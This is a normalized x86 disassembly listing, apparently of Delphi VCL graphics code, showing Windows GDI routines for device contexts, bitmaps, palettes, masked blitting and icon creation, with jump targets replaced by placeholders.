mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x1
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_41d4ec
call sub_41c868
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
push 0x2
mov eax [ ebx + 0x4 ]
push eax
call SetBkMode
pop ebx
retn
sub_41deac
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_41def6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4059b4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41defd
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_41df00
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
xor eax eax
mov [ ebp - 0x104 ] eax
xor eax eax
push ebp
push sub_41df9c
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
call sub_41deac
push 0x0
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push 0x400
push ebx
push 0x0
push 0x1000
call FormatMessageA
test eax eax
je r-xdata
lea eax [ ebp - 0x104 ]
lea edx [ ebp - 0x100 ]
mov ecx 0x100
call sub_404124
mov ecx [ ebp - 0x104 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b32c
call sub_40386c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41dfa3
lea eax [ ebp - 0x104 ]
call sub_403eb4
retn
sub_41dfb8
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x18 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_41e106
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x34 ]
push eax
push 0x18
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
test bl bl
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateBitmap
mov [ ebp - 0x10 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_41e075
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call CreateCompatibleBitmap
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
call sub_41df00
cmp [ ebp - 0x10 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
push eax
push 0x0
call ReleaseDC
retn
call sub_41df00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e10d
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
mov eax [ ebp - 0x1c ]
push eax
call DeleteDC
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov ebx eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov esi eax
push 0xcc0020
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call StretchBlt
test ebx ebx
je r-xdata
test esi esi
je r-xdata
push ebx
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
push esi
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
sub_41e118
mov edx eax
dec dx
je r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
retn
sub dx 0x3
je r-xdata
sub dx 0x4
jne r-xdata
xor eax eax
retn
sub_41e14c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov esi [ ebp + 0x14 ]
mov ebx [ ebp + 0x18 ]
mov [ ebp - 0x9 ] 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
xor eax eax
mov [ ebp - 0x24 ] eax
push 0x0
call CreateCompatibleDC
call sub_41dfa8
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_41e3cc
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
push ebx
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41dfa8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x18 ] eax
push 0x0
mov eax [ rw-data ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
call SelectPalette
cmp [ ebp - 0x24 ] 0x0
je r-xdata
cmp ebx [ ebp + 0x2c ]
jne r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
push 0xffffffff
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x24 ] eax
jmp r-xdata
cmp esi [ ebp + 0x28 ]
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3d3
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
push 0xcc0020
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push r-xdata
push esi
push ebx
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
call StretchBlt
push 0x0
push edi
call SetTextColor
mov [ ebp - 0x1c ] eax
push 0xffffff
push edi
call SetBkColor
mov [ ebp - 0x20 ] eax
push 0x8800c6
push esi
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
push 0x660046
push esi
push ebx
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call StretchBlt
mov eax [ ebp - 0x1c ]
push eax
push edi
call SetTextColor
mov eax [ ebp - 0x20 ]
push eax
push edi
call SetBkColor
cmp [ ebp - 0x18 ] 0x0
je r-xdata
push 0x1
push 0x1
mov eax [ ebp + 0x24 ]
push eax
call CreateCompatibleBitmap
call sub_41dfa8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_41e21f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xcc0020
mov eax 0xaa0029
call sub_406794
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp + 0x2c ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
call MaskBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3d3
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
push eax
call DeleteObject
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
retn
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
sub_41e3e0
push ebx
push esi
push edi
mov esi eax
mov edi esi
mov edx 0xff
lea eax [ edi + edx * 4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ esi + ecx ]
mov bl [ ecx + 0x2 ]
mov [ eax + 0x2 ] bl
mov bl [ ecx + 0x1 ]
mov [ eax + 0x1 ] bl
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
dec edx
test edx edx
jne r-xdata
mov [ edi + 0x3 ] 0x0
pop edi
pop esi
pop ebx
retn
sub_41e418
push ebx
push esi
push edi
add esp 0xfffffff8
mov [ esp ] edx
mov esi eax
mov [ esp + 0x4 ] esi
mov edi [ esp ]
mov edi [ edi ]
dec edi
test edi edi
jle r-xdata
mov eax [ esp ]
cmp [ eax ] 0x100
jge r-xdata
mov ecx 0x1
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov edx 0x100
sub edx [ eax ]
lea edx [ edx + edx * 2 ]
mov eax [ esp ]
mov eax [ eax ]
lea eax [ eax + eax * 2 ]
lea eax [ esi + eax ]
xor ecx ecx
call sub_402b04
mov eax [ esp ]
mov [ eax ] 0x100
mov eax [ esp + 0x4 ]
lea eax [ eax + ecx * 4 ]
lea edx [ ecx + ecx * 2 ]
lea edx [ esi + edx ]
mov bl [ eax + 0x2 ]
mov [ edx + 0x2 ] bl
mov bl [ eax + 0x1 ]
mov [ edx + 0x1 ] bl
mov al [ eax ]
mov [ edx ] al
inc ecx
dec edi
jne r-xdata
sub_41e490
push ebp
mov ebp esp
add esp 0xffffffd4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x2c ]
push eax
call GetSystemInfo
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
dec ecx
js r-xdata
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x2c ]
cmp [ eax + 0x20 ] 0x3
je r-xdata
push ebx
mov eax [ edx + ecx * 4 ]
bswap eax
shr eax 0x8
mov [ edx + ecx * 4 ] eax
dec ecx
jns r-xdata
xor ebx ebx
mov eax [ edx + ecx * 4 ]
mov bh al
mov bl ah
shr eax 0x10
shl ebx 0x8
mov bl al
mov [ edx + ecx * 4 ] ebx
dec ecx
jns r-xdata
pop ebx
jmp r-xdata
sub_41e4e8
push ebp
mov ebp esp
add esp 0xfffffbf8
push ebx
mov [ ebp - 0x408 ] 0x300
mov [ ebp - 0x406 ] 0x10
lea edx [ ebp - 0x404 ]
mov ecx 0x40
call sub_4028c8
push 0x0
call GetDC
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41e5e5
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x68
mov eax [ ebp - 0x4 ]
push eax
call GetDeviceCaps
mov ebx eax
cmp ebx 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e5ec
mov eax [ ebp - 0x4 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebp - 0x404 ]
push eax
push 0x8
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
cmp [ ebp - 0x3e8 ] 0xc0c0c0
jne r-xdata
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x424 ]
push eax
push 0x8
sub ebx 0x8
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e8 ]
push eax
push 0x1
mov eax ebx
sub eax 0x8
push eax
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
movzx eax [ ebp - 0x406 ]
lea eax [ ebp + eax * 4 - 0x420 ]
push eax
push 0x7
sub ebx 0x7
push ebx
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
lea eax [ ebp - 0x3e4 ]
push eax
push 0x1
push 0x7
mov eax [ ebp - 0x4 ]
push eax
call GetSystemPaletteEntries
jmp r-xdata
sub_41e600
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_41e686
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x68
mov eax [ ebp - 0x8 ]
push eax
call GetDeviceCaps
cmp eax 0x10
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
lea eax [ ebx + 0x4 ]
push eax
push 0x8
push 0x0
mov eax [ rw-data ]
push eax
call GetPaletteEntries
movzx eax [ ebx + 0x2 ]
lea eax [ ebx + eax * 4 - 0x1c ]
push eax
push 0x8
push 0x8
mov eax [ rw-data ]
push eax
call GetPaletteEntries
mov [ ebp - 0x1 ] 0x1
sub_41e698
push ebx
push esi
push edi
add esp 0xfffffbfc
mov edi eax
xor esi esi
mov [ esp ] 0x300
test edi edi
je r-xdata
mov [ esp + 0x2 ] cx
mov eax edx
lea edx [ esp + 0x4 ]
shl ecx 0x2
call sub_4028c8
push 0x0
call CreateCompatibleDC
mov ebx eax
push edi
push ebx
call SelectObject
mov edi eax
lea eax [ esp + 0x4 ]
push eax
push 0x100
push 0x0
push ebx
call GetDIBColorTable
mov [ esp + 0x2 ] ax
push edi
push ebx
call SelectObject
push ebx
call DeleteDC
jmp r-xdata
mov eax esi
add esp 0x404
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0x2 ] 0x10
jne r-xdata
cmp [ esp + 0x2 ] 0x0
je r-xdata
movzx edx [ esp + 0x2 ]
lea eax [ esp + 0x4 ]
call sub_41e490
mov eax esp
call sub_41e600
test al al
jne r-xdata
mov eax esp
push eax
call CreatePalette
mov esi eax
sub_41e73c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
mov [ esp ] eax
test ebx ebx
je r-xdata
mov eax [ esp ]
pop edx
pop edi
pop esi
pop ebx
retn
push esp
push 0x4
push ebx
call GetObjectA
test eax eax
je r-xdata
cmp [ esp ] 0x0
je r-xdata
lea eax [ edi + 0x1 ]
cmp eax [ esp ]
jge r-xdata
push esi
mov eax [ esp + 0x4 ]
push eax
push 0x0
push ebx
call GetPaletteEntries
mov eax esi
mov edx [ esp ]
call sub_41e490
mov [ esp ] eax
sub_41e790
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
shr [ eax + 0x8 ] 0x1
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0xe ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e138
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0xe ]
call sub_41e118
mov esi eax
push 0x0
call GetDC
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_41e93c
push [ fs : edx ]
mov [ fs : edx ] esp
mov edi [ ebp - 0x4 ]
mov eax edi
add eax 0x28
mov edx esi
shl edx 0x2
add eax edx
mov [ ebp - 0x14 ] eax
push 0x0
mov eax [ ebp - 0x4 ]
push edi
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41dfa8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e862
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ebp - 0xc ]
call sub_41dfb8
mov [ ebx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e869
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
call sub_41deac
sub_41e869
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
add [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov bx 0x1
mov [ eax + 0xe ] bx
mov eax [ ebp - 0x4 ]
movzx edx bx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov ecx 0x20
call sub_41e138
mov edx [ ebp - 0x4 ]
imul [ edx + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24 ] 0x2
mov eax [ ebp - 0x4 ]
add eax 0x28
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] 0xffffff
push 0x0
mov ebx [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x14 ]
push eax
push 0x4
mov eax [ ebp - 0x4 ]
push ebx
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
call sub_41dfa8
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41e91c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0xc ]
call sub_41dfb8
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e923
mov eax [ ebp - 0xc ]
push eax
call DeleteObject
retn
sub_41e958
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor ecx ecx
mov cl [ edx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
sub ecx eax
xor ebx ebx
mov bl [ edx + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub ebx [ edx + 0x4 ]
mov esi [ ebp - 0x4 ]
movzx esi [ esi ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub esi eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov edi eax
mov eax esi
cdq
xor eax edx
sub eax edx
cmp edi eax
jg r-xdata
xor eax eax
jmp r-xdata
test ecx ecx
jle r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax ebx
cdq
xor eax edx
sub eax edx
mov ecx eax
mov eax [ ebp - 0x8 ]
cdq
xor eax edx
sub eax edx
cmp ecx eax
jg r-xdata
cmp esi ecx
jl r-xdata
test ebx ebx
jle r-xdata
mov al 0x1
cmp ebx [ ebp - 0x8 ]
jle r-xdata
sub_41e9e8
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0xc ]
shl eax 0x4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
call sub_407914
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_41ecdf
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x10 ]
mov ecx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebx ]
or eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebx ]
mov [ eax ] edx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
push 0xb
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
push 0xc
call GetSystemMetrics
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
xor edx edx
push ebp
push sub_41ead1
push [ fs : edx ]
mov [ fs : edx ] esp
push 0xe
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xc
mov eax [ ebp - 0x28 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax ebx
cmp ax 0x8
jbe r-xdata
call sub_41deac
push 0x0
call GetDC
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41ead8
mov eax [ ebp - 0x28 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41ead8
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax + 0x2 ]
call sub_41e94c
mov [ ebp - 0x20 ] eax
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jle r-xdata
mov eax [ ebp - 0x24 ]
add eax eax
mov edx [ ebp - 0x10 ]
lea eax [ edx + eax * 8 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
movzx eax [ eax + 0x1 ]
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x40 ]
mov eax [ eax + 0x8 ]
call sub_407914
mov [ ebp - 0x2c ] eax
xor eax eax
push ebp
push sub_41ecbf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0xc ]
mov eax [ ebp - 0x14 ]
add eax [ ebp + 0x10 ]
sub edx eax
mov cx 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x40 ]
mov ecx [ eax + 0x8 ]
mov ebx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0xc ]
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x38 ]
lea edx [ ebp - 0x34 ]
mov eax ebx
call sub_41e790
lea eax [ ebp - 0x70 ]
push eax
push 0x18
mov eax [ ebp - 0x38 ]
push eax
call GetObjectA
lea eax [ ebp - 0x58 ]
push eax
push 0x18
mov eax [ ebp - 0x34 ]
push eax
call GetObjectA
mov ebx [ ebp - 0x64 ]
imul ebx [ ebp - 0x68 ]
movzx eax [ ebp - 0x60 ]
imul ebx eax
mov eax [ ebp - 0x4c ]
imul [ ebp - 0x50 ]
movzx edx [ ebp - 0x48 ]
imul edx
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x3c ]
add eax ebx
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
call sub_407914
mov [ ebp - 0x30 ] eax
xor eax eax
push ebp
push sub_41ec9c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebp - 0x30 ]
mov esi [ ebp - 0x30 ]
add esi ebx
push edi
push ebx
mov eax [ ebp - 0x38 ]
push eax
call GetBitmapBits
push esi
mov eax [ ebp - 0x3c ]
push eax
mov eax [ ebp - 0x34 ]
push eax
call GetBitmapBits
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
push esi
push edi
mov al [ ebp - 0x46 ]
push eax
mov al [ ebp - 0x48 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
push eax
mov eax [ rw-data ]
push eax
call CreateIcon
mov edx [ ebp - 0x8 ]
mov [ edx ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax ] 0x0
jne r-xdata
mov esi 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eca3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x30 ]
call sub_4026ec
retn
call sub_41df00
inc esi
dec edi
jne r-xdata
cmp ebx [ ebp - 0x20 ]
jl r-xdata
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
movzx eax [ edx + eax * 8 + 0x2 ]
call sub_41e94c
mov ebx eax
cmp ebx [ ebp - 0x1c ]
jg r-xdata
push ebp
mov eax esi
add eax eax
mov edx [ ebp - 0x10 ]
lea edx [ edx + eax * 8 ]
mov eax [ ebp - 0x24 ]
add eax eax
mov ecx [ ebp - 0x10 ]
lea eax [ ecx + eax * 8 ]
call sub_41e958
pop ecx
test al al
je r-xdata
mov [ ebp - 0x24 ] esi
mov [ ebp - 0x20 ] ebx
sub_41ecf0
push ebx
push esi
push edi
add esp 0xffffffac
mov esi ecx
mov ebx edx
xor edx edx
mov [ esp + 0x18 ] edx
push esp
push 0x54
push eax
call GetObjectA
test eax eax
jne r-xdata
cmp eax 0x40
jl r-xdata
call sub_41de94
jmp r-xdata
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402b04
mov [ ebx ] 0x28
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
cmp [ esp + 0x18 ] 0x28
jb r-xdata
mov eax esi
sub eax 0x2
je r-xdata
mov [ ebx + 0xe ] 0x1
jmp r-xdata
dec eax
sub eax 0xe
jb r-xdata
push esi
mov edi ebx
lea esi [ esp + 0x1c ]
mov ecx 0xa
[ edi ] [ esi ]
pop esi
jmp r-xdata
mov [ ebx + 0xc ] 0x1
mov eax [ ebx + 0x20 ]
cmp eax [ ebx + 0x24 ]
jae r-xdata
mov [ ebx + 0xe ] 0x4
mov [ ebx + 0x20 ] esi
jmp r-xdata
sub eax 0xf0
jb r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov [ ebx + 0x24 ] eax
mov [ ebx + 0xe ] 0x8
mov [ ebx + 0x20 ] esi
jmp r-xdata
jmp r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_41e138
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov ax [ esp + 0x12 ]
imul [ esp + 0x10 ]
mov [ ebx + 0xe ] ax
sub_41edd4
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
mov esi ecx
mov ebx edx
lea edx [ ebp - 0x28 ]
mov ecx [ ebp + 0x8 ]
call sub_41ecf0
mov ax [ ebp - 0x1a ]
cmp ax 0x8
jbe r-xdata
mov edx [ ebp - 0x8 ]
test edx edx
jne r-xdata
mov [ ebx ] 0x28
test [ ebp - 0x18 ] 0x3
je r-xdata
mov eax edx
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
mov ecx eax
mov eax 0x1
shl eax cl
shl eax 0x2
add eax 0x28
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ esi ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx ] 0xc
jmp r-xdata
sub_41ee40
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov edx ebx
mov ecx [ ebp + 0x8 ]
mov eax esi
call sub_41ecf0
xor eax eax
mov [ ebp - 0x8 ] eax
push 0x0
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41eedd
push [ fs : eax ]
mov [ fs : eax ] esp
test edi edi
je r-xdata
push 0x0
push ebx
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebx + 0x8 ]
push eax
push 0x0
push esi
mov eax [ ebp - 0xc ]
push eax
call GetDIBits
test eax eax
setne [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41eee4
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
push edi
mov eax [ ebp - 0xc ]
push eax
call SelectPalette
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
push eax
call RealizePalette
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
retn
